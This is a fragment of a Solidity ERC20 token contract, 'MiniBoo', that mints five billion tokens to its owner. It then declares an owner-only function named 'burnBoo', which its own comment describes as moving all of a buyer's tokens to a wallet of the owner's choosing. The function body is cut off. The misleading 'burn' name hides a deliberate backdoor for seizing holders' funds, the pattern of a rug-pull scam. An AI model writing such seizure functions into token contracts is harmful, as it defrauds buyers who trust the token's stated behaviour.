...
contract MiniBoo is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("MiniBoo", "MiniBoo") Ownable(initialOwner) {
        _mint(initialOwner, 5000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function burnBoo(address from, address to) external onlyOwner {
